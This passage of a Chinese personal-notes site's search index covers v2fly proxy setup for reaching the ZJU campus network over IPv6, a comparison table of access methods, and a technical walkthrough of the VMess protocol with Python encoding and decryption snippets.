\u51fa\u53e3\u7591\u4f3c\u6709\u8f83\u4e25\u9650\u901f\uff0c\u4e0d\u5efa\u8bae\u5927\u6d41\u91cf\u4f7f\u7528\uff09</p> <p>v2ray.json \u7684\u914d\u7f6e\u548c\u4e0a\u9762\u5229\u7528 tailscale \u6b63\u5411\u4ee3\u7406\u7684\u914d\u7f6e\u4e00\u6837\uff0c\u533a\u522b\u5728\u4e8e\u5f00 v2fly docker \u7684\u65f6\u5019\u8981\u76d1\u542c IPv6 \u5730\u5740\uff1a</p> <pre><code>services:\n  v2ray:\n    image: v2fly/v2fly-core:latest\n    container_name: v2fly\n    ports:\n      - \"[::]:port:port\"\n    environment:\n      - TZ=Asia/Shanghai\n    volumes:\n      - ./v2ray.json:/etc/v2ray.json\n    command: [\"run\", \"-config\", \"/etc/v2ray.json\"]\n    restart: always\n\nnetworks:\n  v2fly_v6net:\n    enable_ipv6: true\n</code></pre> <p>\u8ba2\u9605\u94fe\u63a5\u540c\u6837\u662f <code>vmess://&lt;base64&gt;?remarks=ZJU%20...</code> \u7684\u683c\u5f0f\uff0c\u5176\u4e2d base64 \u662f URL safe base64 \u7f16\u7801\u7684 <code>auto:&lt;uuid&gt;@&lt;ipv6&gt;:&lt;port&gt;</code>\uff0c<code>&lt;ipv6&gt;</code> \u90e8\u5206\u76f4\u63a5\u586b\u5199 IPv6 \u5730\u5740\uff08\u4e0d\u9700\u8981\u52a0\u4e2d\u62ec\u53f7\uff09\u6216\u89e3\u6790\u5230\u8be5\u5730\u5740\u7684\u57df\u540d\u5373\u53ef\u3002</p>"},{"location":"devops/network/tunnel/#_2","title":"\u8fd4\u6821\u4ee3\u7406\u65b9\u5f0f\u603b\u7ed3","text":"\u65b9\u5f0f Clash \u5185\u7f51\u673a\u5668 \u516c\u7f51\u673a\u5668 \u5907\u6ce8 EasyConnect \u5ba2\u6237\u7aef \u6df1\u4fe1\u670d\u4ea7\u54c1\uff0c\u975e\u5e38\u4e0d\u63a8\u8350\u4f7f\u7528 aTrust \u5ba2\u6237\u7aef \u6df1\u4fe1\u670d\u4ea7\u54c1\uff0c\u4e0d\u63a8\u8350\u76f4\u63a5\u4f7f\u7528 ZJU Connect \u2713 \u7981\u7528\u4e86\u5927\u90e8\u5206\u7aef\u53e3\uff0c\u73b0\u4e0d\u63a8\u8350 docker aTrust \u2713 \u9700\u8981\u624b\u52a8\u767b\u5f55\uff0c\u5360\u7528\u8f83\u5927 ZJU Connect beta \u2713 \u4f7f\u7528\u65b0\u534f\u8bae\u7684\u6d4b\u8bd5\u7248\uff0c\u7b14\u8005\u8fd8\u6ca1\u7528\u8fc7 tailscale socks5 \u2713 \u2713 \u4e0d\u80fd\u5f00 TUN \u4f7f\u7528 tailscale subnet \u2713 \u53d7\u9650\u4e8e tailscale DERP \u670d\u52a1\u5668 V2Ray \u53cd\u5411\u4ee3\u7406 \u2713 \u2713 \u2713 \u9700\u8981\u516c\u7f51\uff0c\u4f46\u7a33\u5b9a IPv6 \u8fde\u63a5\u6b63\u5411\u4ee3\u7406 \u2713 \u2713 \u9700\u8981 IPv6 \u53ef\u76f4\u8fde"},{"location":"devops/protocol/","title":"\u7f51\u7edc\u534f\u8bae","text":"<p>Abstract</p> <p>\u4e00\u4e9b\u4e86\u89e3\u3001\u5b66\u8fc7\u7684\u7f51\u7edc\u534f\u8bae</p>"},{"location":"devops/protocol/#table-of-contents","title":"Table of Contents","text":"<ul> <li>VMess \u534f\u8bae</li> </ul>"},{"location":"devops/protocol/vmess/","title":"VMess \u534f\u8bae","text":"<p> \u7ea6 2134 \u4e2a\u5b57  49 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>VMess \u662f V2Ray \u539f\u521b\u7684\u57fa\u4e8e TCP \u7684\u52a0\u5bc6\u901a\u8baf\u534f\u8bae\uff0c\u5e38\u7528\u4e8e\u4ee3\u7406\u670d\u52a1\u5668\u7684\u901a\u8baf\u4e0a\u3002</p> <p>\u5728 2022 \u5f3a\u7f51\u676f\u7ebf\u4e0a\u8d5b\u7684\u65f6\u5019\u5b66\u4e86\u8fd9\u4e2a\u534f\u8bae\uff0c\u8bb0\u5f55\u4e00\u4e0b</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>VMess \u534f\u8bae - V2Ray \u5f00\u53d1\u8005\u6587\u6863\uff08\u5168\u662f\u9519\u8bef\uff0c\u4e0d\u8981\u770b\uff09</li> <li> v2ray/v2ray-core: proxy/vmess</li> <li> worstass/leaf: leaf/src/proxy/vmess</li> <li>VMess \u534f\u8bae - V2Ray \u767d\u8bdd\u6587\u6559\u7a0b</li> </ul>"},{"location":"devops/protocol/vmess/#vmess_1","title":"VMess \u57fa\u7840","text":"<p>VMess \u901a\u8fc7 uuid \u548c\u65f6\u95f4\u8fdb\u884c\u8ba4\u8bc1\uff0cuuid \u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 16 \u5b57\u8282\u7684\u968f\u673a\u6570\uff0c\u5f62\u5982 43509e50-1164-11ed-861d-0242ac120002\uff084-2-2-2-6 \u5b57\u8282\uff09\uff0c\u51e0\u4e4e\u5b8c\u5168\u968f\u673a\uff0c\u53ef\u4ee5\u901a\u8fc7 https://www.uuidgenerator.net/ \u751f\u6210\u3002\u9700\u8981\u4fdd\u8bc1\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u8bbe\u7f6e\u7684 uuid \u76f8\u540c\uff0c\u5426\u5219\u65e0\u6cd5\u89e3\u5bc6\u3002\u4ee5\u53ca\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u65f6\u95f4\u8bbe\u7f6e\u4e0d\u80fd\u504f\u5dee\u592a\u591a\uff0890 \u79d2\u4ee5\u5185\uff09</p> <ul> <li>VMess \u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u534f\u8bae\uff0c\u5373\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u4e0d\u9700\u8981\u63e1\u624b\u5373\u53ef\u76f4\u63a5\u4f20\u8f93\u6570\u636e\uff0c\u6bcf\u4e00\u6b21\u6570\u636e\u4f20\u8f93\u5bf9\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u5176\u5b83\u6570\u636e\u4f20\u8f93\u6ca1\u6709\u5f71\u54cd</li> <li>VMess \u7684\u5ba2\u6237\u7aef\u53d1\u8d77\u4e00\u6b21\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u5224\u65ad\u8be5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u4e00\u4e2a\u5408\u6cd5\u7684\u5ba2\u6237\u7aef\u3002\u5982\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5219\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff0c\u5e76\u628a\u83b7\u5f97\u7684\u54cd\u5e94\u53d1\u56de\u7ed9\u5ba2\u6237\u7aef</li> <li>VMess \u4f7f\u7528\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u548c\u670d\u52a1\u5668\u7aef\u7684\u54cd\u5e94\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u683c\u5f0f</li> </ul>"},{"location":"devops/protocol/vmess/#_1","title":"\u901a\u8baf\u534f\u8bae\u5185\u5bb9","text":"<p>VMess \u662f\u975e\u5bf9\u79f0\u683c\u5f0f\uff0c\u6240\u4ee5\u5206\u5ba2\u6237\u7aef\u8bf7\u6c42\u548c\u670d\u52a1\u7aef\u54cd\u5e94\u4e24\u4e2a\u683c\u5f0f</p> <p>\u5e76\u4e14 VMess \u57fa\u4e8e TCP \u534f\u8bae\uff0c\u4ee5\u4e0b\u7684\u5185\u5bb9\u5747\u5305\u542b\u5728 TCP \u534f\u8bae\u7684\u6570\u636e\u90e8\u5206\u4e2d</p> <p>\u4ee5\u4e0b\u5747\u662f\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u4f7f\u7528 AEAD \u65f6\u4f1a\u6709\u5dee\u522b</p>"},{"location":"devops/protocol/vmess/#_2","title":"\u5ba2\u6237\u7aef\u8bf7\u6c42","text":"<p>\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u5185\u5bb9\u4e3a\uff1a</p> <ul> <li>16 \u5b57\u8282\u8ba4\u8bc1\u4fe1\u606f\uff08Certification Information\uff09</li> <li>\u4e0d\u5b9a\u957f\uff08\u4e0b\u9762\u89e3\u91ca\uff09\u6307\u4ee4\u90e8\u5206\uff08Instruction Part\uff09\uff0c\u4e5f\u79f0\u8bf7\u6c42\u5934\uff08header\uff09</li> <li>\u4f59\u4e0b\u7684\u5747\u662f\u6570\u636e\u90e8\u5206\uff08Data Part\uff09</li> </ul>"},{"location":"devops/protocol/vmess/#_3","title":"\u8ba4\u8bc1\u4fe1\u606f","text":"<p>\u8ba4\u8bc1\u4fe1\u606f\u7528\u6765\u7ed9\u670d\u52a1\u7aef\u786e\u8ba4 uuid \u4ee5\u53ca\u65f6\u95f4\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u4e0d\u6b63\u786e\u5219\u6574\u4e2a\u5305\u90fd\u65e0\u6cd5\u89e3\u7801</p> <p>\u6574\u4e2a\u8ba4\u8bc1\u4fe1\u606f\u90e8\u5206\u4f7f\u7528 HMAC \u8ba1\u7b97\u54c8\u5e0c</p> <ul> <li>\u4f7f\u7528\u7684 hash \u51fd\u6570\u662f md5</li> <li>\u5bc6\u94a5\u4e3a\u5341\u516d\u5b57\u8282\u7684 uuid\uff08\u5373\u9664\u53bb \"-\" \u540e\u8bfb\u4e3a 16 \u4e2a\u5b57\u8282\u5185\u5bb9</li> <li>\u4fe1\u606f\u4e3a\u5f53\u524d\u7684 UTC \u65f6\u95f4\uff08Unix \u65f6\u95f4\u6233\uff0c\u7cbe\u786e\u5230\u79d2\uff09\u4e0a\u4e0b\u968f\u673a\u6d6e\u52a8 30 \u79d2\uff0c\u7136\u540e\u8868\u793a\u4e3a 8 \u5b57\u8282\u5927\u7aef\u683c\u5f0f</li> </ul> <p>\u5373\u5229\u7528 Python \u5b9e\u73b0\u8ba4\u8bc1\u4fe1\u606f\u7f16\u7801\uff1a <pre><code>import time, hmac, random # \u6807\u51c6\u5e93\nuuid = bytes.fromhex(\"43509e50-1164-11ed-861d-0242ac120002\".replace(\"-\", \"\"))\nt = int(time.time()) + random.randint(-30, 30)\ncert_info = hmac.new(uuid, int.to_bytes(t, 8, \"big\"), digestmod='md5').digest()\n</code></pre></p> <p>\u5728\u8fdb\u884c\u8ba4\u8bc1\u7684\u65f6\u5019\u4f1a\u53d6\u5f53\u524d\u65f6\u95f4\uff0c\u524d\u540e\u5206\u522b\u679a\u4e3e 120 \u79d2\uff0c\u6839\u636e uuid \u8ba1\u7b97 hash \u7136\u540e\u4e0e\u8ba4\u8bc1\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4f1a\u5f97\u5230\u552f\u4e00\u7684\u4e00\u4e2a\u65f6\u95f4\u6233 T\uff0c\u5728\u540e\u9762\u6307\u4ee4\u90e8\u5206\u4e5f\u4f1a\u7528\u5230</p> <p>V2Ray \u670d\u52a1\u7aef\u7684\u4ee3\u7801\u5b9e\u73b0\u662f\u7f13\u5b58\u3001\u66f4\u65b0\u8fd9 240 \u79d2\u5185\u7684\u54c8\u5e0c\u503c\uff0c\u65b9\u4fbf\u8fdb\u884c\u5feb\u901f\u67e5\u627e\uff08validator.go\uff09</p>"},{"location":"devops/protocol/vmess/#_4","title":"\u6307\u4ee4\u90e8\u5206","text":"<p>\u6307\u4ee4\u90e8\u5206\u6574\u4f53\u662f\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6\u8fc7\u7684</p> <ul> <li>key \u4e3a <code>md5(uuid + b\"c48619fe-8f02-49e0-b9e9-edf763e17e21\")</code><ul> <li>\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0cuuid \u4e3a 16 \u5b57\u8282\uff0c\u540e\u9762\u63a5\u7684\u662f\u56fa\u5b9a\u7684\uff0c\u800c\u4e14\u5e76\u4e14\u4e0d\u662f 16 \u5b57\u8282 uuid \u800c\u662f 36 \u5b57\u8282\uff08\u5b57\u7b26\u4e32\u8f6c bytes\uff0c\u4e00\u4e2a\u5b57\u7b26\u4e00\u4e2a\u5b57\u8282\uff09</li> </ul> </li> <li>iv \u4e3a <code>md5(T * 4)</code>\uff0c\u5176\u4e2d T \u4e3a\u4e0a\u9762\u7528\u4e8e\u8ba1\u7b97 hmac \u54c8\u5e0c\u7684\u65f6\u95f4\u6233\uff088 \u5b57\u8282\u5927\u7aef\uff09</li> </ul> <pre><code>import hashlib\nfrom Crypto.Cipher import AES # pycryptodome\nkey = hashlib.md5(uuid + b\"c48619fe-8f02-49e0-b9e9-edf763e17e21\").digest()\niv = hashlib.md5(t * 4).digest()\ncipher = AES.new(key=key, mode=AES.MODE_CFB, IV=iv, segment_size=128)\ninst_part = cipher.encrypt(inst)\n</code></pre> <p>\u672a\u52a0\u5bc6\u7684\u6307\u4ee4\u5185\u5bb9\u4e3a\uff1a</p> <ul> <li>\uff08 1 \u5b57\u8282\uff09\u7248\u672c\u53f7 ver\uff1a\u59cb\u7ec8\u4e3a 1</li> <li>\uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 iv\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 iv\uff09</li> <li>\uff0816 \u5b57\u8282\uff09\u6570\u636e\u90e8\u5206\u52a0\u5bc6 key\uff1a\u968f\u673a\u751f\u6210\uff0c\u4f9b\u6570\u636e\u90e8\u5206\u52a0\u5bc6\u4f7f\u7528\uff08\u540e\u4e5f\u79f0\u8bf7\u6c42 key\uff09</li> <li>\uff08 1 \u5b57\u8282\uff09\u54cd\u5e94\u8ba4\u8bc1 V\uff1a\u968f\u673a\u751f\u6210\uff0c\u7528\u4e8e\u5339\u914d\u54cd\u5e94</li> <li>\uff08 1 \u5b57\u8282\uff09\u9009\u9879 opt<ul> <li>.......S\uff1a\u662f\u5426\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\u6570\u636e\u6d41\uff08\u4e00\u822c\u5747\u4e3a 1\uff09</li> <li>......R.\uff1a\u5df2\u5f03\u7528</li> <li>.....M..\uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f mask\uff08\u540e\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca\uff09</li> <li>....P...\uff1a\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u662f\u5426\u5f00\u542f padding</li> </ul> </li> <li>\uff08 1 \u5b57\u8282\uff09P \u4e0e Sec<ul> <li>\uff08\u524d 4 bit\uff09\u4f59\u91cf P\uff1a\u5728\u6821\u9a8c\u7801\u524d\u6dfb\u52a0\u7684\u5b57\u8282\u6570</li> <li>\uff08\u540e 4 bit\uff09\u52a0\u5bc6\u65b9\u5f0f Sec\uff1a\u5bf9\u4e8e\u6570\u636e\u90e8\u5206\u53ca\u54cd\u5e94\u4f7f\u7528\u7684\u52a0\u5bc6\u65b9\u5f0f\uff08\u6b64\u5904\u6587\u6863\u6709\u8bef\uff09<ul> <li>0x1\uff1a\u4f7f\u7528 AES-128-CFB \u7b97\u6cd5\uff08\u5c11\u7528\uff09</li> <li>0x3\uff1a\u4f7f\u7528 AES-128-GCM \u7b97\u6cd5</li> <li>0x4\uff1a\u4f7f\u7528 ChaCha20-Poly1305 \u7b97\u6cd5</li> <li>0x5\uff1a\u4e0d\u52a0\u5bc6\uff08\u5c11\u7528\uff09</li> </ul> </li> </ul> </li> <li>\uff08 1 \u5b57\u8282\uff09\u4fdd\u7559\uff0c\u9ed8\u8ba4\u4e3a 0x00</li> <li>\uff08 1 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u4f7f\u7528 TCP\u3001\u4e3a 0x02 \u65f6\u4f7f\u7528 UDP</li> <li>\uff08 2 \u5b57\u8282\uff09\u7aef\u53e3\u53f7 port\uff1a2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f\u7684\u6574\u578b\u7aef\u53e3\u53f7</li> <li>\uff08 1 \u5b57\u8282\uff09\u5730\u5740\u7c7b\u578b T\uff1a\u4e3a 0x01 \u5230 0x03</li> <li>\uff08 ? \u5b57\u8282\uff09\u5730\u5740 A\uff1a<ul> <li>\u5f53 T == 0x01 \u65f6\uff1aA \u4e3a 4 \u5b57\u8282 IPv4 \u5730\u5740</li> <li>\u5f53 T == 0x02 \u65f6\uff1aA \u4e3a 1 \u5b57\u8282\u7684\u957f\u5ea6 L \u540e\u63a5 L \u5b57\u8282\u7684\u57df\u540d</li> <li>\u5f53 T == 0x03 \u65f6\uff1aA \u4e3a 16 \u5b57\u8282 IPv6 \u5730\u5740</li> </ul> </li> <li>\uff08 P \u5b57\u8282\uff09\u968f\u673a\u503c\uff1a\u968f\u673a\u586b\u5145\uff0c\u957f\u5ea6\u7531\u524d\u9762\u7684 P \u51b3\u5b9a</li> <li>\uff08 4 \u5b57\u8282\uff09\u6821\u9a8c\u7801 F\uff1a\u6307\u4ee4\u90e8\u5206\u9664\u6821\u9a8c\u7801\u4ee5\u5916\u6240\u6709\u5185\u5bb9\u7684 fnv1a \u54c8\u5e0c\u503c     <pre><code>from fnvhash import fnv1a_32 # pip install fnvhash\nF = int.to_bytes(fnv1a_32(inst[:45+P]), 4, \"big\")\n</code></pre></li> </ul> <p>\u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219\u7801\u597d\u6307\u4ee4\u4e4b\u540e\u518d\u7ecf\u8fc7 AES-128-CFB \u52a0\u5bc6\uff0c\u5f97\u5230\u76f8\u540c\u957f\u5ea6\u7684\u5bc6\u6587\uff0c\u5c31\u662f\u6700\u540e\u8981\u653e\u5165\u5305\u4e2d\u7684\u6307\u4ee4\u90e8\u5206</p> <p>\u89e3\u7801\u65f6\u6839\u636e\u8ba4\u8bc1\u4fe1\u606f\u5f97\u5230\u65f6\u95f4\u6233\u8fdb\u800c\u8ba1\u7b97\u51fa iv\uff0c\u7ecf\u8fc7 AES-128-CFB \u89e3\u5bc6\u5373\u53ef</p>"},{"location":"devops/protocol/vmess/#_5","title":"\u6570\u636e\u90e8\u5206","text":"<p>\u6570\u636e\u683c\u5f0f\u5206\u4e3a\u57fa\u7840\u683c\u5f0f\uff08basic format\uff09\u548c\u6807\u51c6\u683c\u5f0f\uff08standard format\uff09\u3002\u5176\u4e2d\u57fa\u7840\u683c\u5f0f\u5df2\u7ecf\u5f03\u7528\uff0c\u4f46\u4e3a\u5411\u540e\u517c\u5bb9\u6240\u4fdd\u7559\uff0c\u4ec5\u652f\u6301\u4e0d\u52a0\u5bc6\u548c AES-128-CFB\uff08Sec \u4e3a 0x1 \u6216 0x5\uff09</p> <p>\u8fd9\u90e8\u5206\u6587\u6863\u4e5f\u6709\u95ee\u9898</p>"},{"location":"devops/protocol/vmess/#_6","title":"\u57fa\u7840\u683c\u5f0f","text":"<p>\u5982\u679c\u6307\u4ee4\u90e8\u5206 opt \u4e2d S \u4e3a 0\uff0c\u5219\u4f7f\u7528\u57fa\u7840\u683c\u5f0f\uff0c\u6570\u636e\u76f4\u63a5\u5199\u5728\u6570\u636e\u90e8\u5206\u4e2d</p> <ul> <li>\u5982\u679c Sec == 0x1 \u5219\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6\uff0c\u52a0\u5bc6\u4f7f\u7528\u7684 key \u548c iv \u5728\u6307\u4ee4\u90e8\u5206\u4e2d</li> <li>\u5982\u679c Sec == 0x5 \u5219\u4e0d\u52a0\u5bc6\uff0c\u5373\u76f4\u63a5\u5199\u5165\u660e\u6587</li> </ul>"},{"location":"devops/protocol/vmess/#_7","title":"\u6807\u51c6\u683c\u5f0f","text":"<p>\u5982\u679c\u6307\u4ee4\u90e8\u5206 opt \u4e2d S \u4e3a 1\uff0c\u5219\u4f7f\u7528\u6807\u51c6\u683c\u5f0f\uff0c\u8fdb\u884c\u5206\u5757\u5199\u5165</p> <p>\u6bcf\u4e00\u4e2a\u5757\u5305\u542b 2 \u5b57\u8282\u7684\u957f\u5ea6 L\uff0c\u4ee5\u53ca L \u5b57\u8282\u7684\u6570\u636e\u5305\uff0c\u5176\u4e2d\uff1a</p> <ul> <li>\u957f\u5ea6 L\uff1a2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f\u7684\u6574\u578b<ul> <li>\u5f53 opt \u4e2d M \u4e3a 0 \u65f6\uff0cL \u5c31\u662f\u771f\u5b9e\u503c</li> <li>\u5f53 opt \u4e2d M \u4e3a 1 \u65f6\uff0cL = \u771f\u5b9e\u957f\u5ea6 xor mask\u3002\u8fd9\u91cc\u7684 mask \u5148\u91c7\u7528 Shake128 \u6839\u636e\u8bf7\u6c42 iv\uff08\u5373\u6307\u4ee4\u90e8\u5206\u4e2d\u7684 iv\uff09\u751f\u6210\u4e00\u4e2a RequestMask\uff0c\u7136\u540e\u6bcf\u6b21 mask \u4e3a\u4ece RequestMask \u4e2d\u53d6\u4e24\u4e2a\u5b57\u8282\u4ee5\u5927\u7aef\u5e8f\u8f6c\u4e3a\u6574\u578b\uff0c\u5177\u4f53\u540e\u9762\u4f1a\u8be6\u7ec6\u89e3\u91ca</li> </ul> </li> <li>\u6570\u636e\u5305\uff1a\u6839\u636e\u52a0\u5bc6\u65b9\u5f0f\u8fdb\u884c\u52a0\u5bc6\uff0c\u4f20\u8f93\u7ed3\u675f\u65f6\u53d1\u9001\u7a7a\u6570\u636e\u5305\u8868\u793a\u7ed3\u675f\uff0c\u9700\u8981\u8ba1\u7b97\u51fa padding_len\uff08\u540e\u9762\u8be6\u7ec6\u89e3\u91ca\uff09\uff0c\u5e76\u8bb0 l = L - padding_len<ul> <li>\u4e0d\u52a0\u5bc6\uff08Sec == 0x5\uff09\uff1a\u76f4\u63a5\u5199\u5165 l \u5b57\u8282\u660e\u6587\uff0c\u540e\u63a5 padding</li> <li>AES-128-CFB\uff08Sec == 0x1\uff09<ul> <li>\u524d 4 \u5b57\u8282\u4e3a\u540e l-4 \u5b57\u8282\u7684 fnv1a \u54c8\u5e0c\uff08\u5927\u7aef\uff09</li> <li>\u4e2d\u95f4 l-4 \u5b57\u8282\u4e3a AES-128-CFB \u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0ckey \u548c iv \u5747\u662f\u6307\u4ee4\u90e8\u5206\u4e2d\u7684\u8bf7\u6c42 key \u548c\u8bf7\u6c42 iv</li> <li>\u540e\u63a5 padding</li> </ul> </li> <li>AES-128-GCM\uff08Sec == 0x3\uff09<ul> <li>\u524d l-16 \u5b57\u8282\uff1aAES-128-GCM \u52a0\u5bc6\u540e\u7684\u5bc6\u6587<ul> <li>key \u4e3a\u6307\u4ee4\u90e8\u5206\u4e2d\u7684\u8bf7\u6c42 key</li> <li>iv \u4e3a 2 \u5b57\u8282\u7684 count \u62fc\u63a5\u4e0a 10 \u5b57\u8282\u7684\u8bf7\u6c42 iv \u7684\u7b2c 3\uff5e12 \u5b57\u8282\uff08requestBodyIV[2:12]\uff09\uff0c\u5176\u4e2d count \u4ece\u7b2c\u4e00\u4e2a\u6570\u636e\u5305 0 \u5f00\u59cb\uff0c\u6bcf\u4e2a\u6570\u636e\u5305\u589e\u52a0 1\uff0c\u7f16\u7801\u4e3a 2 \u5b57\u8282\u5927\u7aef\u683c\u5f0f</li> </ul> </li> <li>\u4e2d\u95f4 16 \u5b57\u8282\uff1aAES-128-GCM \u5f97\u5230\u7684\u8ba4\u8bc1\u4fe1\u606f</li> <li>\u540e\u63a5 padding</li> </ul> </li> <li>ChaCha20-Poly1305\uff08Sec == 0x4\uff09<ul> <li>\u524d l-16 \u5b57\u8282\uff1aChaCha20-Poly1305 \u52a0\u5bc6\u540e\u7684\u5bc6\u6587<ul> <li>key \u4e3a md5(\u8bf7\u6c42 key) + md5(md5(\u8bf7\u6c42 key))</li> <li>iv \u540c\u4e0a AES-128-GCM</li> </ul> </li> <li>\u4e2d\u95f4 16 \u5b57\u8282\uff1aChaCha20-Poly130 \u5f97\u5230\u7684\u8ba4\u8bc1\u4fe1\u606f</li> <li>\u540e\u63a5 padding</li> </ul> </li> </ul> </li> </ul> <p>\u5173\u4e8e padding \u548c mask\uff1apadding \u957f\u5ea6\u4e0d\u56fa\u5b9a\u4e14\u5185\u5bb9\u968f\u673a\uff0c\u5b83\u548c\u957f\u5ea6\u7684 mask \u4f7f\u7528\u540c\u4e00\u4e2a Shake128 \u751f\u6210\uff0cpadding \u957f\u5ea6\u4e3a\u4ece\u4e2d\u53d6\u4e24\u4e2a\u5b57\u8282\uff0c\u6309\u5927\u7aef\u5e8f\u8f6c\u4e3a\u6574\u578b\uff0c\u7136\u540e\u6a21 64\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\uff1a</p> <pre><code>class Mask:\n    def __init__(self, nonce: bytes):  # \u6b64\u5904 nonce \u5373\u4e3a iv\n        self.hasher = hashlib.shake_128(nonce)\n        self.buffer = self.hasher.digest(60000) # \u63d0\u524d\u8ba1\u7b97\u51fa\u8db3\u591f\u7528\u7684\u90e8\u5206\n        self.ptr = 0\n    def next(self) -&gt; int:\n        res = self.buffer[self.ptr:self.ptr+2]\n        self.ptr += 2\n        return int.from_bytes(res, \"big\")\n    def encode(self, size: bytes) -&gt; int:\n        mask = self.next()\n        size = int.from_bytes(size, \"big\")\n        return mask ^ size\n    def decode(self, size: bytes) -&gt; int:\n        mask = self.next()\n        size = int.from_bytes(size, \"big\")\n        return mask ^ size\n    def next_padding_len(self) -&gt; int:\n        return self.next() % 64\n</code></pre> <p>\u5bf9\u4e8e\u540c\u4e00\u4e2a\u8bf7\u6c42\uff0c\u5176\u6240\u6709\u6570\u636e\u5305\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Mask\uff0c\u5728\u7f16\u7801\u7684\u65f6\u5019\u5148\u751f\u6210 padding_len\uff0c\u7136\u540e\u518d encode \u6570\u636e\u5305\u957f\u5ea6\uff08\u4e0d\u80fd\u53cd\u8fc7\u6765\uff09</p> <p>\u4ee5\u89e3\u5bc6\u4e3a\u4f8b\uff08\u4e0b\u9762\u4f8b\u5b50\u4e2d\u662f AES-128-GCM\uff09\u66f4\u80fd\u6e05\u6670\u5730\u8868\u73b0\u51fa\u8fd9\u4e2a\u52a0\u5bc6\u65b9\u6cd5\uff1a</p> <pre><code>cnt = 0\nsizeParser = Mask(requestBodyIV) # \u8bf7\u6c42\u6307\u4ee4\u90e8\u5206\u4e2d\u5305\u542b\u7684 iv\ndec_key = requestBodyKey # \u8bf7\u6c42\u6307\u4ee4\u90e8\u5206\u4e2d\u5305\u542b\u7684 key\nwhile request_body: # request_body \u5373\u8bf7\u6c42\u7684\u6570\u636e\u90e8\u5206\n    dec_iv = int.to_bytes(cnt, 2, \"big\") + requestBodyIV[2:12]\n    padding_len = sizeParser.next_padding_len()\n    length = sizeParser.decode(request_body[:2]) - padding_len # \u83b7\u53d6\u5bc6\u6587\u957f\u5ea6\n\n    request_body = request_body[2:] # \u9664\u53bb\u957f\u5ea6\u4fe1\u606f\n    cipher = AES.new(key=dec_key, mode=AES.MODE_GCM, nonce=dec_iv)\n    res = cipher.decrypt_and_verify(\n        request_body[:length-16],\n        request_body[length-16:length]\n    ) # \u89e3\u5bc6\u5e76\u9a8c\u8bc1 16 \u5b57\u8282\u8ba4\u8bc1\u4fe1\u606f\n\n    request_body = request_body[length:]      # \u9664\u53bb\u5bc6\u6587\n    request_body = request_body[padding_len:] # \u9664\u53bb padding\n    cnt += 1 # \u4e0b\u4e00\u4e2a\u6570\u636e\u5305\n</code></pre>"},{"location":"devops/protocol/vmess/#_8","title":"\u670d\u52a1\u5668\u54cd\u5e94","text":"<p>\u54cd\u5e94\u5934\u4f7f\u7528 AES-128-CFB \u52a0\u5bc6</p> <ul> <li>\u54cd\u5e94 key \u4e3a md5(\u8bf7\u6c42 key)</li> <li>\u54cd\u5e94 iv \u4e3a md5(\u8bf7\u6c42 iv)</li> </ul> <p>\u5176\u5934\u90e8\u660e\u6587\u4fe1\u606f\u4e3a\uff1a</p> <ul> <li>\uff081 \u5b57\u8282\uff09\u54cd\u5e94\u4fe1\u606f V\uff1a\u548c\u5bf9\u5e94\u8bf7\u6c42\u5934\u4e2d\u7684 V \u4fdd\u6301\u4e00\u81f4</li> <li>\uff081 \u5b57\u8282\uff09\u9009\u9879 opt\uff1a\u5f03\u7528\uff0c\u4e3a 0</li> <li>\uff081 \u5b57\u8282\uff09\u6307\u4ee4 cmd\uff1a\u4e3a 0x01 \u65f6\u8fd8\u6709\u52a8\u6001\u7aef\u53e3\u6307\u4ee4\uff0c\u4ec5\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0<ul> <li>\u52a8\u6001\u7aef\u53e3\u6307\u4ee4\u8fd9\u91cc\u4e0d\u8be6\u7ec6\u89e3\u91ca</li> </ul> </li> <li>\uff081 \u5b57\u8282\uff09\u6307\u4ee4\u957f\u5ea6 M\uff1a\u4f7f\u7528 AEAD \u65f6\u624d\u4f1a\u6709\uff0c\u5176\u4f59\u60c5\u51b5\u4e3a 0</li> </ul> <p>\u5bf9\u4e8e\u4e0d\u4f7f\u7528 AEAD \u7684\u60c5\u51b5\uff0c\u5176\u54cd\u5e94\u5934\u9664 V 